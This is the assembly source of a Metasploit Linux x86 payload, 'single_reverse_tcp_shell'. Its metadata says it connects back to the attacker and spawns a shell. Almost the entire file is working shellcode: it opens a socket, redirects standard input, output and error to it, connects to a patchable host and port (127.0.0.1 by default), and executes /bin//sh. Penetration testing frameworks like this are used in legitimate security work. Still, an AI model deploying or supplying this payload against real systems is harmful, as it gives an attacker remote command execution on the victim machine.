;;
; 
;        Name: single_reverse_tcp_shell
;     Version: $Revision: 1512 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Single reverse TCP shell.
;
; Meta-Information:
;
; meta-shortname=Linux Reverse TCP Shell
; meta-description=Connect back to the attacker and spawn a shell
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=linux
; meta-arch=ia32
; meta-category=single
; meta-connection-type=reverse
; meta-name=reverse_tcp_shell
; meta-basemod=Msf::PayloadComponent::ReverseConnection
; meta-offset-lhost=0x1a
; meta-offset-lport=0x20
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

socket:
	push ebx
	inc  ebx
	push ebx
	push byte 0x2
	push byte 0x66
	pop  eax
	mov  ecx, esp
	int  0x80
	xchg eax, ebx

dup:
	pop  ecx
dup_loop:
	mov  al, 0x3f
	int  0x80
	dec  ecx
	jns  dup_loop

connect:
	pop  ebx
	pop  edx
	push dword 0x0100007f
	push word 0xbfbf
	inc  ebx
	push bx
	mov  ecx, esp
	mov  al, 0x66
	push eax
	push ecx
	push ebx
	mov  ecx, esp
	inc  ebx
	int  0x80

execve:
	push edx
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov  ebx, esp
	push edx
	push ebx
	mov  ecx, esp
	mov  al, 0x0b
	int  0x80
